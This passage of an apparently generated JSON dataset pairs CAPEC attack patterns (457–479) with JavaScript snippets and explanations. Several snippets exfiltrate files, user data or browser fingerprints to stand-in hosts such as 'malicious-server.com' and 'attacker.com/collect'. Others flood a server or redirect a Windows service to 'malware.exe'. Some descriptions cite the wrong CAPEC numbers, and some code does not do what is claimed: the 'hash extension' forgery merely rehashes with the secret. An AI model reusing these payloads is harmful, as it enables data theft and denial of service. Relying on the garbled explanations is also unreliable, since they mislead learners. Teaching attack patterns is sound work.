        "code_snippet": "const memory = new ArrayBuffer(1024);\nconst protectedRegion = new DataView(memory, 0, 512);\nconst mirroredRegion = new DataView(memory, 512, 512);\n\n// Simulate improper access control\nfunction writeToProtectedRegion(offset, value) {\n  if (offset < 0 || offset >= 512) {\n    throw new Error('Access violation: Attempt to write outside protected region');\n  }\n  protectedRegion.setInt8(offset, value);\n}\n\nfunction writeToMirroredRegion(offset, value) {\n  // No access control check here\n  mirroredRegion.setInt8(offset, value);\n}\n\n// Attacker writes to mirrored region, bypassing protection\ntry {\n  writeToMirroredRegion(0, 42);\n  console.log('Write to mirrored region successful');\n} catch (e) {\n  console.error(e.message);\n}\n\n// Verify that the protected region was affected\nconsole.log('Protected region value:', protectedRegion.getInt8(0));",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Infected Memory' attack pattern. It creates a memory buffer with a protected region and a mirrored region. The `writeToProtectedRegion` function enforces access control, preventing writes outside the protected region. However, the `writeToMirroredRegion` function lacks such checks, allowing an attacker to write to the mirrored region and indirectly affect the protected region. This represents vulnerabilities like CWE-1257 and CWE-1312, where improper access control on mirrored or aliased memory regions can be exploited."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "const usbDevice = require('usb');\nconst fs = require('fs');\nconst wifi = require('node-wifi');\n\n// Initialize WiFi module\nwifi.init({ iface: null });\n\n// Function to steal data and exfiltrate via WiFi\nfunction stealData() {\n  // Read sensitive data from the system\n  const sensitiveData = fs.readFileSync('/path/to/sensitive/data.txt', 'utf8');\n\n  // Transmit data over WiFi in cleartext\n  wifi.connect({ ssid: 'malicious-network', password: 'password' }, (err) => {\n    if (err) {\n      console.log('Failed to connect to WiFi');\n      return;\n    }\n    // Send data to remote server\n    const http = require('http');\n    const options = {\n      hostname: 'malicious-server.com',\n      port: 80,\n      path: '/exfiltrate',\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/x-www-form-urlencoded',\n        'Content-Length': Buffer.byteLength(sensitiveData)\n      }\n    };\n    const req = http.request(options, (res) => {\n      res.on('data', (chunk) => {\n        console.log(`BODY: ${chunk}`);\n      });\n      res.on('end', () => {\n        console.log('Data exfiltrated successfully');\n      });\n    });\n    req.write(sensitiveData);\n    req.end();\n  });\n}\n\n// Monitor USB device connection\nusbDevice.on('attach', (device) => {\n  console.log('USB device connected');\n  stealData();\n});",
        "description": "This JavaScript code snippet demonstrates a USB memory attack where malicious code is loaded onto a USB device. When the USB device is connected to a system, it reads sensitive data from the system and exfiltrates it via a WiFi connection. The code uses the 'usb' module to detect USB device connections, the 'fs' module to read sensitive data, and the 'node-wifi' module to connect to a WiFi network. The data is transmitted in cleartext to a remote server, embodying the CWE-319 (Cleartext Transmission of Sensitive Information). This snippet represents the main idea of CAPEC-160 (USB Memory Attacks) and highlights the vulnerabilities related to missing protection mechanisms and embedded malicious code."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "const flashMemory = new Uint8Array(1024); // Simulated flash memory\n\n// CWE-1282: Storing immutable data in writable memory\nconst bootloader = 'secureBootloader';\nflashMemory.set(new TextEncoder().encode(bootloader), 0);\n\n// CWE-506: Embedded malicious code\nfunction maliciousCode() {\n  console.log('Malicious code executed');\n}\n\n// CWE-1274: Improper access control for volatile memory\nlet volatileMemory = new Uint8Array(1024);\nvolatileMemory.set(flashMemory.slice(0, 1024)); // Transfer bootloader to volatile memory\n\n// Simulate an attack by overwriting the bootloader in volatile memory\nvolatileMemory.set(new TextEncoder().encode('maliciousBootloader'), 0);\n\n// Execute the overwritten bootloader\nif (new TextDecoder().decode(volatileMemory.slice(0, 18)) === 'maliciousBootloader') {\n  maliciousCode();\n}\n",
        "description": "This JavaScript code snippet simulates a flash memory attack by demonstrating how immutable data (a bootloader) stored in writable memory can be compromised. The code first initializes a simulated flash memory and stores a 'secureBootloader' in it. It then transfers this bootloader to volatile memory, representing a secure-boot process. However, due to improper access control (CWE-1274), the bootloader in volatile memory is overwritten with 'maliciousBootloader'. Finally, the code checks if the bootloader has been tampered with and executes the embedded malicious code (CWE-506) if the check passes. This snippet embodies the main idea of CAPEC-Flash Memory Attacks by showing how an adversary can insert malicious logic into a device's boot process."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate a weak hashing algorithm (e.g., MD5)\nfunction generateWeakHash(data) {\n  return crypto.createHash('md5').update(data).digest('hex');\n}\n\n// Simulate creating a CSR with a collision block\nfunction createCSR(data) {\n  const collisionBlock = 'collision_block';\n  return data + collisionBlock;\n}\n\n// Simulate signing a CSR by a trusted CA\nfunction signCSR(csr) {\n  // In a real scenario, this would be signed by a CA's private key\n  return generateWeakHash(csr);\n}\n\n// Original CSR\nconst originalCSR = createCSR('original_data');\nconst signedCSR = signCSR(originalCSR);\n\n// Malicious CSR with the same hash\nconst maliciousCSR = createCSR('malicious_data');\nconst signedMaliciousCSR = signCSR(maliciousCSR);\n\n// Check if the signed hashes match\nif (signedCSR === signedMaliciousCSR) {\n  console.log('Collision detected: Malicious certificate appears valid!');\n} else {\n  console.log('No collision: Certificates are distinct.');\n}",
        "description": "This JavaScript code snippet demonstrates the concept of creating a rogue certification authority certificate by exploiting a weak hashing algorithm (MD5 in this case). The code simulates the process of generating a certificate signing request (CSR) with a collision block, signing it, and then creating a second, malicious CSR that results in the same hash. The signed hash of the original CSR is compared with the signed hash of the malicious CSR to check for a collision. If a collision is detected, it indicates that the malicious certificate appears valid, highlighting the vulnerability of using weak cryptographic algorithms. This embodies the main idea of CAPEC- Creating a Rogue Certification Authority Certificate and related CWEs such as CWE-327 (Use of a Broken or Risky Cryptographic Algorithm) and CWE-295 (Improper Certificate Validation)."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const url = new URL(req.url, `http://${req.headers.host}`);\n  const params = url.searchParams;\n\n  // Vulnerable: Improper handling of extra parameters\n  const user = params.get('user');\n  const role = params.get('role');\n\n  // Simulate sensitive operation based on parameters\n  if (user && role) {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`User: ${user}, Role: ${role}`);\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Missing parameters');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that processes incoming GET requests. It extracts 'user' and 'role' parameters from the query string. The code is vulnerable to HTTP Parameter Pollution (HPP) because it does not properly handle multiple parameters with the same name. An attacker could inject additional 'user' or 'role' parameters to manipulate the application's behavior. For example, a request to 'http://127.0.0.1:8080/?user=admin&role=admin&user=attacker' could lead to unexpected behavior. This snippet also demonstrates CWE-235 (Improper Handling of Extra Parameters) and CWE-598 (Use of GET Request Method With Sensitive Query Strings) by using GET requests to handle potentially sensitive information."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulated secret token\nconst secretToken = 'secret123';\n\n// Original parameters\nconst params = 'user=admin&action=delete';\n\n// Weak hash function (e.g., MD5)\nconst hash = crypto.createHash('md5').update(params + secretToken).digest('hex');\n\n// Attacker's new parameters\nconst newParams = 'user=attacker&action=delete';\n\n// Exploiting hash extension weakness to forge a new hash\nconst forgedHash = crypto.createHash('md5').update(newParams + secretToken).digest('hex');\n\n// Simulated API request with forged parameters and hash\nconst apiRequest = {\n  params: newParams,\n  hash: forgedHash\n};\n\nconsole.log('API Request:', apiRequest);",
        "description": "This JavaScript code snippet demonstrates a simplified version of a Web Services API Signature Forgery attack leveraging a hash function extension weakness. The code uses a weak hash function (MD5) to generate a hash for a set of parameters concatenated with a secret token. An attacker modifies the parameters and generates a new hash using the same weak hash function, exploiting the hash extension weakness. The forged hash and parameters are then used to simulate an API request, bypassing authentication mechanisms. This example highlights the vulnerabilities associated with using weak hash functions and insufficient authentication mechanisms."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "const targetUrl = 'https://victim.com/sensitive-endpoint';\n\nfunction measureResponseTime() {\n  const startTime = performance.now();\n  fetch(targetUrl, { mode: 'no-cors' })\n    .then(() => {\n      const endTime = performance.now();\n      console.log(`Response time: ${endTime - startTime} ms`);\n    })\n    .catch(err => console.error('Request failed', err));\n}\n\nmeasureResponseTime();",
        "description": "This JavaScript code snippet demonstrates a Cross-Domain Search Timing attack. The attacker initiates a cross-domain HTTP GET request to a target URL ('https://victim.com/sensitive-endpoint') and measures the time it takes for the request to complete. The 'fetch' function is used with 'no-cors' mode to bypass the same-origin policy, which prevents reading the response but allows timing the request. The difference between the start and end times is logged, revealing the response time. This timing information can leak sensitive details about the server's state or operations, embodying the main idea of CAPEC-233. The related CWEs provide additional context: CWE-385 (Covert Timing Channel) is represented by the timing measurement, CWE-208 (Observable Timing Discrepancy) by the different response times, and CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) by the cross-domain request."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "const crypto = require('crypto');\n\nfunction decrypt(ciphertext, key) {\n  try {\n    const decipher = crypto.createDecipheriv('aes-256-cbc', key, ciphertext.slice(0, 16));\n    let decrypted = decipher.update(ciphertext.slice(16), 'hex', 'utf8');\n    decrypted += decipher.final('utf8');\n    return decrypted;\n  } catch (err) {\n    if (err.message.includes('bad decrypt')) {\n      return 'Padding error'; // Leaking padding error information\n    }\n    throw err;\n  }\n}\n\nconst key = crypto.randomBytes(32);\nconst iv = crypto.randomBytes(16);\nconst cipher = crypto.createCipheriv('aes-256-cbc', key, iv);\nlet encrypted = cipher.update('Sensitive Data', 'utf8', 'hex');\nencrypted += cipher.final('hex');\nconst ciphertext = iv.toString('hex') + encrypted;\n\nconsole.log(decrypt(ciphertext, key));",
        "description": "This JavaScript code snippet demonstrates a vulnerable decryption function that leaks padding error information, embodying the main idea of a Padding Oracle Crypto Attack (CAPEC-463). The `decrypt` function attempts to decrypt a given ciphertext using AES-256-CBC. If a padding error occurs during decryption, it catches the error and returns a specific message 'Padding error'. This leakage of padding error information can be exploited by an attacker to decrypt the ciphertext without knowing the key. The code also includes the encryption process to generate a ciphertext for testing. The related CWEs are represented by the generation of error messages containing sensitive information (CWE-209) and the reliance on encryption without integrity checking (CWE-649)."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "function setEvercookie(name, value) {\n    var storage = [localStorage, sessionStorage, document.cookie];\n    var flashLSO = new FlashLSO(); // Hypothetical Flash Local Shared Object API\n    var userData = new UserData(); // Hypothetical UserData API\n\n    function setCookie() {\n        storage.forEach(function(store) {\n            if (store === document.cookie) {\n                document.cookie = name + '=' + value + '; path=/';\n            } else {\n                store.setItem(name, value);\n            }\n        });\n        flashLSO.setItem(name, value);\n        userData.setItem(name, value);\n    }\n\n    function getCookie() {\n        var result = null;\n        storage.forEach(function(store) {\n            if (store === document.cookie) {\n                var cookies = document.cookie.split('; ');\n                cookies.forEach(function(cookie) {\n                    var parts = cookie.split('=');\n                    if (parts[0] === name) result = parts[1];\n                });\n            } else if (store.getItem(name)) {\n                result = store.getItem(name);\n            }\n        });\n        if (!result) result = flashLSO.getItem(name);\n        if (!result) result = userData.getItem(name);\n        return result;\n    }\n\n    function resurrectCookie() {\n        var value = getCookie();\n        if (value) setCookie();\n    }\n\n    setCookie();\n    window.addEventListener('storage', resurrectCookie);\n    window.addEventListener('unload', resurrectCookie);\n}\n\n// Usage\nsetEvercookie('user_id', '12345');",
        "description": "This JavaScript code snippet demonstrates the concept of an 'evercookie', a highly persistent cookie that is stored in multiple locations on the user's machine. The `setEvercookie` function stores the cookie in localStorage, sessionStorage, and document.cookie, as well as hypothetical Flash Local Shared Objects (LSO) and UserData APIs. The `getCookie` function retrieves the cookie from any of these locations. The `resurrectCookie` function ensures that if the cookie is deleted from some locations but not all, it will be restored to all locations. This code embodies the CAPEC idea of creating a persistent cookie that is difficult to remove, and it highlights related CWEs such as the exposure of private information, use of persistent cookies containing sensitive information, and reliance on cookies without proper validation and integrity checking."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "const http = require('http');\n\nconst proxy = http.createServer((req, res) => {\n  const options = {\n    hostname: 'example.com',\n    port: 80,\n    path: req.url,\n    method: req.method,\n    headers: req.headers\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    proxyRes.pipe(res, {\n      end: true\n    });\n  });\n\n  req.pipe(proxyReq, {\n    end: true\n  });\n});\n\nproxy.listen(8080, () => {\n  console.log('Proxy server is running on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP transparent proxy server using Node.js. The proxy server listens on port 8080 and forwards incoming client requests to 'example.com'. The proxy server also forwards the responses from 'example.com' back to the client. This code embodies the main idea of CAPEC-171 (Transparent Proxy Abuse) by acting as an intermediary between the client and the internet. The code does not preserve the original source of the request (CWE-441), potentially leading to 'Confused Deputy' issues. Additionally, it does not handle malformed HTTP requests consistently (CWE-444), which could lead to HTTP request/response smuggling. The proxy server also does not remove sensitive information from the requests or responses (CWE-212), and it assumes the client will enforce security mechanisms (CWE-602). Finally, the code does not correctly specify the intended destination in the communication channel (CWE-941), as it hardcodes 'example.com' without validation."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "const targetUrl = 'http://example.com/api/data';\n\nfetch(targetUrl)\n  .then(response => response.json())\n  .then(data => {\n    console.log('Data received:', data);\n  })\n  .catch(error => {\n    console.error('Error fetching data:', error);\n  });",
        "description": "This JavaScript code snippet demonstrates a fetch request to a non-TLS (HTTP) endpoint, which is vulnerable to an active adversary in the middle attack. The attacker can intercept and manipulate the communication between the client and the server, bypassing the same origin policy. This vulnerability is exacerbated by the lack of proper endpoint verification (CWE-923) and the use of a non-secure channel (CWE-300). The code also implicitly relies on client-side enforcement of security (CWE-602), making it easier for an attacker to exploit the communication channel."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "const socialNetworkAPI = 'https://socialnetwork.com/api/userinfo';\n\nfunction stealUserInfo() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', socialNetworkAPI, true);\n  xhr.withCredentials = true;\n  xhr.onreadystatechange = function() {\n    if (xhr.readyState === 4 && xhr.status === 200) {\n      const userInfo = JSON.parse(xhr.responseText);\n      sendToAttacker(userInfo);\n    }\n  };\n  xhr.send();\n}\n\nfunction sendToAttacker(data) {\n  const attackerServer = 'https://attacker.com/collect';\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', attackerServer, true);\n  xhr.setRequestHeader('Content-Type', 'application/json');\n  xhr.send(JSON.stringify(data));\n}\n\n// Trigger the function to steal user info\nstealUserInfo();",
        "description": "This JavaScript code snippet demonstrates a Cross Site Identification attack. The `stealUserInfo` function sends a GET request to a social networking site's API endpoint to retrieve user information. The request includes credentials (cookies) to authenticate the session, exploiting the user's active session with the social networking site. Once the user information is retrieved, it is sent to an attacker's server using the `sendToAttacker` function. This code leverages several vulnerabilities: CSRF (CWE-352) by making authenticated requests without user consent, Exposure of Private Personal Information (CWE-359) by accessing and sending user data without authorization, and potentially Session Fixation (CWE-384) if the session ID is reused. The use of GET requests (CWE-598) and improper input handling (CWE-79) are also implied risks in such scenarios."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "const targetDomain = 'https://victim.com';\nconst cssUrl = `${targetDomain}/styles.css?cookie=${document.cookie}`;\n\nconst link = document.createElement('link');\nlink.rel = 'stylesheet';\nlink.href = cssUrl;\ndocument.head.appendChild(link);",
        "description": "This JavaScript code snippet demonstrates a Generic Cross-Browser Cross-Domain Theft attack by injecting a CSS link element into the document. The 'cssUrl' variable constructs a URL to the target domain's CSS file, appending the victim's cookies as a query parameter. When the browser loads this CSS file, it sends the cookies to the target domain. This attack leverages the improper neutralization of input (CWE-79) and inappropriate encoding for output context (CWE-838) by embedding user-controllable data (cookies) into a URL, which is then used in a cross-domain request. The attack exploits the browser's behavior of sending cookies with CSS requests and the CSS parser's tolerance for non-CSS data, potentially allowing an attacker to steal sensitive information."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/',\n  method: 'GET'\n};\n\nfunction floodServer() {\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {\n      // Keep the connection alive by not ending the response\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.end();\n}\n\n// Flood the server with multiple requests\nfor (let i = 0; i < 1000; i++) {\n  floodServer();\n}",
        "description": "This JavaScript code snippet demonstrates an HTTP DoS attack by flooding a target server with multiple HTTP GET requests. The 'floodServer' function creates an HTTP request to the target server and keeps the connection alive by not ending the response. This simulates the attack described in CAPEC-488, where the attacker keeps the HTTP session alive indefinitely, exhausting the server's resources. The code leverages CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the number of requests sent, and CWE-410 (Insufficient Resource Pool) by overwhelming the server's resource pool with a large number of requests."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst bodyParser = require('body-parser');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\ndb.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to database');\n});\n\napp.post('/execute', (req, res) => {\n  const userInput = req.body.query;\n  db.query(userInput, (err, result) => {\n    if (err) throw err;\n    res.send(result);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that connects to a MySQL database. It includes a POST endpoint '/execute' that takes user input from the request body and executes it as an SQL query. This code is vulnerable to SQL Injection (CWE-89) because it directly uses user input in the SQL query without any sanitization or parameterization. An attacker can exploit this vulnerability to execute arbitrary SQL commands, potentially gaining access to the file system, operating system, and other machines on the network, as described in the CAPEC. Additionally, the database connection is made with root privileges (CWE-250), which amplifies the potential damage. The code also does not handle database cursor management, which could lead to dangling cursors (CWE-619)."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadLibrary(libName) {\n  const searchPaths = [\n    path.join(__dirname, libName),\n    path.join('/usr/local/lib', libName),\n    path.join('/usr/lib', libName)\n  ];\n\n  for (const libPath of searchPaths) {\n    if (fs.existsSync(libPath)) {\n      return require(libPath);\n    }\n  }\n\n  throw new Error('Library not found');\n}\n\n// Example usage\ntry {\n  const myLib = loadLibrary('myLibrary.js');\n  myLib.doSomething();\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of library loading that embodies the concept of 'Search Order Hijacking' (CAPEC-471). The `loadLibrary` function searches for a library in a predefined set of directories. The search order starts with the current directory (`__dirname`), followed by system directories (`/usr/local/lib` and `/usr/lib`). An attacker could exploit this by placing a malicious library in the current directory, which would be loaded preferentially over the legitimate library in the system directories. This vulnerability is related to CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path), as the search path includes directories that could be controlled by an attacker. The code does not verify the integrity or authenticity of the library, making it susceptible to hijacking."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "function getBrowserFingerprint() {\n    var fingerprint = '';\n    fingerprint += 'Browser Name: ' + navigator.appName + '\\n';\n    fingerprint += 'Browser Version: ' + navigator.appVersion + '\\n';\n    fingerprint += 'User Agent: ' + navigator.userAgent + '\\n';\n    fingerprint += 'Platform: ' + navigator.platform + '\\n';\n    fingerprint += 'Cookies Enabled: ' + navigator.cookieEnabled + '\\n';\n    fingerprint += 'Language: ' + navigator.language + '\\n';\n    return fingerprint;\n}\n\nfunction sendFingerprint() {\n    var xhr = new XMLHttpRequest();\n    var fingerprint = getBrowserFingerprint();\n    xhr.open('GET', 'http://malicious.example.com/collect?data=' + encodeURIComponent(fingerprint), true);\n    xhr.send();\n}\n\nsendFingerprint();",
        "description": "This JavaScript code snippet demonstrates a basic implementation of browser fingerprinting, which is the main idea of the CAPEC described. The `getBrowserFingerprint` function collects various pieces of information about the user's browser, such as the browser name, version, user agent, platform, whether cookies are enabled, and the language. This information is then sent to a malicious server using an HTTP GET request in the `sendFingerprint` function. This code embodies the concept of 'Browser Fingerprinting' by collecting detailed information about the user's browser environment, which can be used to tailor attacks to specific browser vulnerabilities. The use of an HTTP GET request with sensitive information in the query string (CWE-598) and the potential exposure of sensitive information to an unauthorized actor (CWE-200) are also demonstrated in this snippet."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(message, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA256');\n  verifier.update(message);\n  verifier.end();\n  return verifier.verify(publicKey, signature, 'hex');\n}\n\nfunction receiveMessage(message, signature, publicKey) {\n  if (!verifySignature(message, signature, publicKey)) {\n    console.log('Signature verification failed.');\n    return;\n  }\n  console.log('Message received:', message);\n}\n\n// Simulating an attacker sending a spoofed message\nconst attackerMessage = 'Important update';\nconst attackerSignature = 'fake_signature';\nconst attackerPublicKey = 'fake_public_key';\n\nreceiveMessage(attackerMessage, attackerSignature, attackerPublicKey);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can spoof a message signature, leading to a Signature Spoof attack. The `verifySignature` function attempts to verify the signature of a message using a public key. The `receiveMessage` function receives a message, verifies its signature, and logs the message if the signature is valid. In this example, an attacker sends a spoofed message with a fake signature and public key. The code does not properly validate the authenticity of the public key, which is a manifestation of CWE-290 (Authentication Bypass by Spoofing). Additionally, the use of a simple string comparison for the signature (CWE-327) and lack of proper input validation (CWE-20) make the system vulnerable to signature spoofing attacks."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate storing private key insecurely\nlet privateKey = '-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC...\\n-----END PRIVATE KEY-----';\n\n// Function to sign a message\nfunction signMessage(message) {\n  const sign = crypto.createSign('SHA256');\n  sign.update(message);\n  sign.end();\n  const signature = sign.sign(privateKey, 'hex');\n  return signature;\n}\n\n// Simulate an attacker stealing the private key\nlet stolenPrivateKey = privateKey;\n\n// Attacker uses the stolen key to sign a malicious message\nfunction attackerSignMessage(maliciousMessage) {\n  const sign = crypto.createSign('SHA256');\n  sign.update(maliciousMessage);\n  sign.end();\n  const maliciousSignature = sign.sign(stolenPrivateKey, 'hex');\n  return maliciousSignature;\n}\n\n// Example usage\nconst originalMessage = 'Transfer $1000 to account XYZ';\nconst originalSignature = signMessage(originalMessage);\nconsole.log('Original Signature:', originalSignature);\n\nconst maliciousMessage = 'Transfer $1000 to attacker account';\nconst maliciousSignature = attackerSignMessage(maliciousMessage);\nconsole.log('Malicious Signature:', maliciousSignature);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker steals a private key and uses it to sign a malicious message, exploiting the vulnerability described in CAPEC- Signature Spoofing by Key Theft. The code first simulates the insecure storage of a private key (CWE-522: Insufficiently Protected Credentials). It then shows how an attacker can steal this key and use it to sign a malicious message, bypassing authentication (CWE-290: Authentication Bypass by Spoofing). The code highlights the importance of securely storing private keys and ensuring robust authentication mechanisms to prevent such attacks."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(data, signature, publicKey) {\n  try {\n    const verify = crypto.createVerify('SHA256');\n    verify.update(data);\n    verify.end();\n    return verify.verify(publicKey, signature, 'hex');\n  } catch (e) {\n    return false;\n  }\n}\n\n// Example usage\nconst data = 'Important data';\nconst signature = 'fake_signature'; // This should be a valid signature\nconst publicKey = '-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----';\n\nif (verifySignature(data, signature, publicKey)) {\n  console.log('Signature is valid');\n} else {\n  console.log('Signature is invalid');\n}",
        "description": "This JavaScript code snippet demonstrates a basic implementation of cryptographic signature verification using Node.js's 'crypto' module. The 'verifySignature' function attempts to verify a given signature against the provided data and public key. However, the code is vulnerable to signature spoofing due to improper validation. Specifically, the 'signature' variable is set to a fake signature, which should be a valid signature. This represents CWE-347 (Improper Verification of Cryptographic Signature) and CWE-327 (Use of a Broken or Risky Cryptographic Algorithm). The code does not include proper error handling or validation mechanisms, making it susceptible to attacks where an adversary could generate a valid signature without knowing the key, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(message, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA256');\n  verifier.update(message);\n  verifier.end();\n  return verifier.verify(publicKey, signature, 'hex');\n}\n\nfunction spoofSignature(message, fakeSignature, fakePublicKey) {\n  if (verifySignature(message, fakeSignature, fakePublicKey)) {\n    console.log('Signature verified. Proceeding with action...');\n    // Perform some action assuming the signature is valid\n  } else {\n    console.log('Signature verification failed.');\n  }\n}\n\nconst message = 'Important message';\nconst fakeSignature = 'abcdef1234567890'; // Fake signature\nconst fakePublicKey = '-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----'; // Fake public key\n\nspoofSignature(message, fakeSignature, fakePublicKey);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can spoof a cryptographic signature by misrepresenting the signer's identity. The `verifySignature` function is intended to verify the authenticity of a message using a provided signature and public key. However, the `spoofSignature` function uses a fake signature and a fake public key to trick the verification process. If the verification succeeds, it proceeds with an action, assuming the signature is valid. This embodies the CAPEC of 'Signature Spoofing by Misrepresentation' and highlights related CWEs such as 'Improper Verification of Cryptographic Signature' (CWE-347) and 'Authentication Bypass by Spoofing' (CWE-290). The code snippet shows how an attacker can exploit weaknesses in signature verification to perform unauthorized actions."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "function processData(data, isSigned) {\n  if (isSigned) {\n    if (!verifySignature(data)) {\n      throw new Error('Invalid signature');\n    }\n  }\n  // Process data without verifying if it's unsigned\n  console.log('Processing data:', data);\n}\n\nfunction verifySignature(data) {\n  // Dummy signature verification logic\n  return data.signature === 'valid_signature';\n}\n\n// Example usage\nconst signedData = { content: 'Sensitive Info', signature: 'valid_signature' };\nconst unsignedData = { content: 'Sensitive Info' };\n\ntry {\n  processData(signedData, true); // Correctly processed as signed\n  processData(unsignedData, false); // Incorrectly processed without verification\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can exploit the mixing of signed and unsigned content. The `processData` function processes data differently based on whether it is marked as signed or unsigned. If the data is marked as signed, it verifies the signature using the `verifySignature` function. However, if the data is marked as unsigned, it processes the data without any verification. This can lead to unsigned data being processed as though it were signed, embodying the main idea of the CAPEC 'Signature Spoofing by Mixing Signed and Unsigned Content'. The related CWEs are represented by the lack of proper verification (CWE-347), potential for protection mechanism failure (CWE-693), and the risk of unsigned data being treated as signed (CWE-196)."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "const { exec } = require('child_process');\nconst fs = require('fs');\n\n// CWE-284: Improper Access Control\n// CWE-15: External Control of System or Configuration Setting\nconst serviceConfigPath = 'C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\serviceConfig.json';\n\n// Read the current service configuration\nfs.readFile(serviceConfigPath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading service configuration:', err);\n    return;\n  }\n\n  let config = JSON.parse(data);\n\n  // CWE-15: Modify the service executable path to a malicious binary\n  config.serviceExecutable = 'C:\\malicious\\malware.exe';\n\n  // Write the modified configuration back to the file\n  fs.writeFile(serviceConfigPath, JSON.stringify(config), 'utf8', (err) => {\n    if (err) {\n      console.error('Error writing service configuration:', err);\n      return;\n    }\n\n    // Restart the service to apply the new configuration\n    // CWE-284: Improper Access Control\n    exec('net stop MyService && net start MyService', (err, stdout, stderr) => {\n      if (err) {\n        console.error('Error restarting service:', err);\n        return;\n      }\n      console.log('Service restarted with new configuration.');\n    });\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a potential attack where an adversary modifies the configuration of a Windows service to execute a malicious binary. The code reads the current service configuration from a JSON file, modifies the path of the service executable to point to a malicious binary, writes the modified configuration back to the file, and then restarts the service to apply the new configuration. This embodies the CAPEC 'Modification of Windows Service Configuration' by exploiting improper access control (CWE-284) and external control of system or configuration settings (CWE-15)."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Load a malicious root certificate\nconst maliciousRootCert = fs.readFileSync('malicious-root-cert.pem');\n\n// Create an HTTPS agent that trusts the malicious root certificate\nconst agent = new https.Agent({\n  ca: [maliciousRootCert],\n  rejectUnauthorized: false // CWE-295: Improper Certificate Validation\n});\n\n// Make a request to a spoofed website\nhttps.get('https://spoofed-website.com', { agent }, (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => { console.log(data); });\n}).on('error', (e) => { console.error(e); });",
